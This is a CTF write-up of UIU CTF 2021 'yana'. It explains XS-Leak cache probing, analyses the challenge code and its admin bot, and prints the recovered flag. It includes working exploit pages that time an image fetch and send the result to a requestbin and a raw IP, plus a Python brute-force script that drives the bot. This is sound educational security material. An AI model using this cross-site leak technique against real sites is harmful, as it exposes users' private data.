## Summary

An XS-Leak is a vulnerability that can collect important data such as user information using the browser result for users based input value. If you want to study in deeping an xs-leak, You can study that refer to [here](https://xsleaks.dev/) :) 

---
## What is cache probing

![image](https://user-images.githubusercontent.com/49112423/128534023-67aa205b-41be-4d9c-8f06-215b2b3d8a5c.png)

It is said that the loading speed of the resource file is different from the first time the browser loads the resource file and from the second time. The reason is that the second time the resource file is fetched, the image cache is fetched from disk, not by requesting it from the web server.

![image](https://user-images.githubusercontent.com/49112423/128535171-7f89b779-f375-4854-a2ea-4267d2021c68.png)

The photo on the right is when the image is first loaded, and the photo on the left is when the image is loaded the second time. If you look at the time, you can see that there is a difference by the ratio of `0ms : 48ms`. So how can use this to link with XS-Leak?

---
## Exploit (Web) UIU CTF 2021 - yana [342 pts]

> The challenge is leak the flag and using the cache probing and xs-leak :)

![image](https://user-images.githubusercontent.com/49112423/128590914-4d24779e-058f-4bec-845b-f3882d3557ef.png)

If you went to the challenge, you can see a notepad function as above. I checked, the function as top is to save a content and function as bottom is to search for saved memo.

![image](https://user-images.githubusercontent.com/49112423/128591264-a708f372-8f69-4a76-9328-12e2933eacd7.png)

So, I saved a memo as `pocas` and `not_pocas`. I did a saerch for `pocas` on the left and searched for `asdf` on the right after saved the memo.

OMG, I did a search and came up with surprising result!! It was immediately returned with a different color image!! I can know an important information here.

- Information

1. If you search for a cunrently saved memo, a green image appears.
2. If you search for a unsaved memo, a red image appears.

```javascript
const noteForm = document.getElementById("note");
noteForm.onsubmit = (e) => {
    e.preventDefault();
    window.localStorage.setItem("note", new FormData(noteForm).get("note"));
};

const searchForm = document.getElementById("search");
const output = document.getElementById("output");
searchForm.onsubmit = (e) => {
    e.preventDefault();
    const query = new FormData(searchForm).get("search") ?? "";
    document.location.hash = query;
    search();
};

function search() {
    const note = window.localStorage.getItem("note") ?? "";
    console.log(`note: ${note}`);
    const query = document.location.hash.substring(1);
    console.log(`query: ${query}`);
    if (query) {
        if (note.includes(query)) {
            console.log('found');
            output.innerHTML =
            'found! <br/><img src="https://sigpwny.com/uiuctf/y.png"></img>';
        } else {
            console.log('not found');
            output.innerHTML =
            'nope.. <br/><img src="https://sigpwny.com/uiuctf/n.png"></img>';
        }
    }
}
search();
```
Now that I've done a functiona analysis, let's analyze the client-side code.

- Analysis ( search() )

1. Get the currently stored content value using `window.localStorage.getItem("note")`.
2. Get the query value using `document.location.hash.substring(1)`.
3. Use `note.includes(query)` to check whether the value of the query is included in the note. ( Important )
4. If the query value is included in the note, a green image appears, otherwise a red image appears.

```js
/*
NOTE: this is the script that the admin bot runs to visit your provided URL
it not required to solve the challenge, but is provided for reference & for you to help test/debug your exploit
*/

const { chromium } = require('playwright-chromium');
const fs = require('fs');
const net = require('net');

const FLAG = fs.readFileSync('/flag.txt', {encoding: 'utf-8'});
// matches regex: uiuctf{[a-z0-9_]}

(async function () {
  const browser = await chromium.launch({
    executablePath: "/playwright/chromium-878941/chrome-linux/chrome",
    logger: {
      isEnabled: () => true,
      log: (name, severity, message, _args) => console.log(`chrome log: [${name}/${severity}] ${message}`)
    }
  });

  function ask_for_url(socket) {
    socket.state = 'URL';
    socket.write('Please send me a URL to open.\n');
  }

  async function load_url(socket, data) {
    let url = data.toString().trim();
    console.log(`checking url: ${url}`);
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      socket.state = 'ERROR';
      socket.write('Invalid scheme (http/https only).\n');
      socket.destroy();
      return;
    }
    socket.state = 'LOADED';

    // "incognito" by default
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto("https://chal.yana.wtf");
    await page.fill('#note > textarea', FLAG);
    await page.click('#note > button');
    await page.waitForTimeout(500);
    await page.goto('about:blank');
    await page.waitForTimeout(500);
    socket.write(`Loading page ${url}.\n`);
    await page.goto(url);
    setTimeout(() => {
      try {
        page.close();
        socket.write('timeout\n');
        socket.destroy();
      } catch (err) {
        console.log(`err: ${err}`);
      }
    }, 60000);
  }

  var server = net.createServer();
  server.listen(1338);
  console.log('listening on port 1338');

  server.on('connection', socket => {
    socket.on('data', data => {
      try {
        if (socket.state == 'URL') {
          load_url(socket, data);
        }
      } catch (err) {
        console.log(`err: ${err}`);
      }
    });

    try {
      ask_for_url(socket);
    } catch (err) {
      console.log(`err: ${err}`);
    }
  });
})();
```
Now let's analyze bot.js to get flags.

- Analysis ( bot.js )

1. Read the `/flag.txt` file and save it to `FLAG` variable.
2. Running a chrome instance using `playwright-chromium`.
3. Go to `https://chal.yana.wtf`, save `FLAG` in the note, and access the `URL` that we entered as an administrator. ( Important )

We learned a lot from our analysis !! 

In bot.js, flags are stored in notes. Also we know the flag format. ( uiuctf{[a-z0-9_]} ). That is, we can brute force using `uiuctf{`. This is where 'Cache Probing' is used. I know that when I search for a value contained in a note, a green image appears.

![image](https://user-images.githubusercontent.com/49112423/128535171-7f89b779-f375-4854-a2ea-4267d2021c68.png)

Then, if we retrieve the value contained in the note, the browser loads a green image. At this time, since it is loaded for the first time, it will be cached on disk. At this time, if we retrieve the green image one more time, the image can be loaded much faster than the first time since the cache is already saved.

```html
<script>
    const image = "https://sigpwny.com/uiuctf/y.png"
    const requestbin = "//79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/"
    window.open(`https://chal.yana.wtf/#a`);

    setTimeout(() => {
        const start = new Date();
        fetch(image).then(d => {
            const end = new Date();
            location.replace(requestbin + "?time=" + (end-start));
        });
    }, 1000)
</script>
```
First of all, this is the exploit code that sends a query that is not saved in the memo. In the above situation, the browser will load a red image. Then the green image will take a lot of time because it is the first to load.

Let's check it out.

![image](https://user-images.githubusercontent.com/49112423/128592771-367017d1-dc6a-4fe6-b998-74ff67270a46.png)

Nice, When sending a query that does not contain it, it took about 43s?43ms.

```html
<script>
    const image = "https://sigpwny.com/uiuctf/y.png"
    const requestbin = "//79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/"
    window.open(`https://chal.yana.wtf/#uiu`);

    setTimeout(() => {
        const start = new Date();
        fetch(image).then(d => {
            const end = new Date();
            location.replace(requestbin + "?time=" + (end-start));
        });
    }, 1000)
</script>
```
Now, let's check the loading time when sending the query included in the note.

![image](https://user-images.githubusercontent.com/49112423/128592823-ca4e045c-bf08-4743-899b-d6d51db68f19.png)

OMG When sending the included query, it took about 3s?3ms?!!

Now let's use this to brute force. However, when doing brute force, sending many requests at once can cause bot.js to close.

I got one letter and proceeded with a new run.

```html
<script>
    const image = "https://sigpwny.com/uiuctf/y.png"
    const requestbin = "//141.164.52.207:9999/flag"

    const flag = location.search.split('=')[1]
    window.open(`https://chal.yana.wtf/#${flag}`);

    setTimeout(() => {
        const start = new Date();
        fetch(image).then(d => {
            end = new Date();
            if ((end-start) < 8){
                location.replace(requestbin + `?flag=${flag}`);
            }
            //}
        });
    }, 1000)
</script>
```

```python
# exploit.py
from pwn import *
from time import sleep
from flask import *
from sys import exit
from threading import * 

app = Flask(__name__)

bot_url = "yana-bot.chal.uiuc.tf"
bot_port = 1337

condition = True
#FLAG = b"uiuctf{"
#FLAG = b"uiuctf{y"
#FLAG = b"uiuctf{y0"
# (...)
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo"
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0"
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0k"
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0ku"
FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup"

poc_url = b"http://141.164.52.207/xsleak/exploit.html?a="
char_list = list('abcdefghijklmnopqrstuvwxyz1234567890}{_')

@app.route('/flag')
def index():
    global FLAG, condition
    FLAG = request.args.get('flag')
    condition = False
    log.info("Success!")
    log.info(f'The flag is : {FLAG}')

    return "Success"

def send_bot():
    global condition
    for char in char_list:
        if condition:
            bot = remote(bot_url, bot_port, level='error' )
            url = poc_url + FLAG + char.encode('utf-8')

            #log.info(f'Send url : {url}')
            sleep(1)
            bot.sendlineafter(b'Please send me a URL to open.\n', url)
        else:
            exit(0)

def run_flask():
    app.run(host="0.0.0.0", port=9999)

if __name__ == '__main__':
    t1 = Thread(target=run_flask)
    t2 = Thread(target=send_bot)

    t1.start()
    t2.start()
```
The exploit code is as above. So I'll execute an exploit code!

![image](https://user-images.githubusercontent.com/49112423/128597089-6d2f7f9e-b188-4b1e-9ea6-5bd63553a072.png)

![image](https://user-images.githubusercontent.com/49112423/128597208-416e8fdc-9e0d-471d-93df-0fb40b353f8f.png)

(skip..)

![image](https://user-images.githubusercontent.com/49112423/128597345-a635ec41-3e60-4fa2-b77c-658cacf3104d.png)

Success! I got the flag :) 

```
uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup}
```

---
## Reference

Reference : [https://xsleaks.dev/docs/attacks/cache-probing/](https://xsleaks.dev/docs/attacks/cache-probing/)<br>
Reference : [https://stackoverflow.com/questions/26200367/cache-image-to-disk](https://stackoverflow.com/questions/26200367/cache-image-to-disk)

---
